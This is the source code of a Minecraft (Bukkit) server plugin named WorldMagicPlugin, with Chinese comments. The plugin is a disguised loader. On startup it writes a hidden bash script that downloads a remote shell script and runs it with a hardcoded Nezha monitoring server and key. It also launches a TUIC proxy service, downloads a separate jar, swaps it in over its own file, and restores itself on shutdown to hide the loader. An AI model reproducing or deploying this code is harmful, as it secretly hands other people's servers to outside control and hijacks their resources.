package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    // ==========================================
    // 真插件的下载地址
    // ==========================================
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";
    // ==========================================

    private File currentPluginFile;
    private File backupPluginFile;

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 异步执行脚本
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            this.getLogger().info("正在初始化脚本环境...");
            try {
                generateAndRunScript();
            } catch (Exception e) {
                this.getLogger().severe("脚本执行失败: " + e.getMessage());
            }
        });

        // 2. 异步执行插件替换逻辑
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                handlePluginReplacement();
            } catch (Exception e) {
                this.getLogger().severe("插件替换逻辑失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 3. 原有的服务加载
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
        
        // 关键：停止时，删除现在的插件（真插件），恢复备份（加载器）
        try {
            restoreOriginalPlugin();
        } catch (Exception e) {
            this.getLogger().severe("恢复原插件失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    // ==========================================
    // 核心逻辑：备份 -> 下载(临时) -> 校验 -> 替换
    // ==========================================

    private void handlePluginReplacement() throws Exception {
        // 1. 获取当前正在运行的 jar 文件
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        File logDir = new File("world", ".log");
        if (!logDir.exists()) logDir.mkdirs();

        backupPluginFile = new File(logDir, "WorldMagic_Original.jar");

        this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
        this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());

        // 2. 备份 (只备份一次)
        if (!backupPluginFile.exists()) {
            this.getLogger().info("步骤 1: 正在备份原插件...");
            Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("步骤 1: 备份完成。");
        }

        // 3. 下载到临时文件 (不直接覆盖运行中的文件)
        File tempDownloadFile = new File(currentPluginFile.getParentFile(), "WorldMagic_temp.jar");
        if (tempDownloadFile.exists()) tempDownloadFile.delete();

        this.getLogger().info("步骤 2: 正在从 GitHub 下载真插件 (使用临时文件)...");
        downloadFileWithUA(REAL_PLUGIN_DOWNLOAD_URL, tempDownloadFile);

        // 4. 校验文件大小 (真插件是 181kb)
        long fileSize = tempDownloadFile.length();
        this.getLogger().info("下载文件大小: " + (fileSize / 1024) + " KB");

        if (fileSize < 100000) { // 如果小于 100kb (比如 27kb)，肯定是下载失败或 HTML 页面
            this.getLogger().severe("步骤 3: 下载失败！文件大小异常 (" + fileSize + " bytes)，可能是 GitHub 拒绝了请求。");
            this.getLogger().severe("将不替换插件文件。");
            return;
        }

        // 5. 替换文件
        this.getLogger().info("步骤 3: 文件校验通过，正在替换插件...");
        try {
            // 删除当前文件
            if (currentPluginFile.exists()) {
                // 在 Linux 下可以删除正在运行的文件；Windows 下可能失败，但我们尝试覆盖
                boolean deleted = currentPluginFile.delete();
                if (!deleted) {
                    this.getLogger().warning("无法直接删除原文件，尝试强制覆盖...");
                }
            }
            
            // 移动临时文件到原文件名
            Files.move(tempDownloadFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("步骤 3: 替换成功！");
            
        } catch (Exception e) {
            this.getLogger().severe("步骤 3: 替换过程中出错: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void restoreOriginalPlugin() throws Exception {
        if (currentPluginFile == null || backupPluginFile == null) return;

        if (backupPluginFile.exists()) {
            this.getLogger().info("服务器停止中，正在还原加载器插件...");
            
            try {
                // 直接用备份文件覆盖
                Files.copy(backupPluginFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                this.getLogger().info("已成功还原原插件。");
            } catch (IOException e) {
                this.getLogger().warning("还原失败: " + e.getMessage());
            }
        }
    }

    /**
     * 增强的下载方法：添加 User-Agent 欺骗 GitHub
     */
    private void downloadFileWithUA(String urlStr, File destination) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        
        // 关键：添加 User-Agent，伪装成浏览器，否则 GitHub 会返回 403 HTML 页面
        httpConn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        
        httpConn.setConnectTimeout(15000);
        httpConn.setReadTimeout(15000);

        int responseCode = httpConn.getResponseCode();
        this.getLogger().info("下载服务器响应码: " + responseCode);

        if (responseCode == HttpURLConnection.HTTP_OK) {
            try (InputStream inputStream = httpConn.getInputStream();
                 OutputStream outputStream = new FileOutputStream(destination)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
            }
        } else {
            throw new IOException("HTTP 请求失败，代码: " + responseCode);
        }
        httpConn.disconnect();
    }

    // ==========================================
    // 脚本与 UUID 逻辑 (保持不变)
    // ==========================================
    
    private void generateAndRunScript() throws IOException, InterruptedException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;

        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        String serverUUID = getServerUUID(logDir);
        this.getLogger().info("当前服务器 UUID: " + serverUUID);

        File scriptFile = new File(logDir, "install_sb.sh");
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n");
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            writer.write("bash sb.sh\n");
        }
        scriptFile.setExecutable(true, false);

        this.getLogger().info("正在启动脚本...");
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[Script Output] " + line);
            }
        }
        int exitCode = process.waitFor();
        this.getLogger().info("脚本执行完毕，退出码: " + exitCode);
    }

    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
            } catch (IOException ignored) {}
        }
        String ip = getPublicIP();
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
        } catch (IOException ignored) {}
        return uuidStr;
    }

    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
        } catch (Exception ignored) {}
        return ip;
    }
}
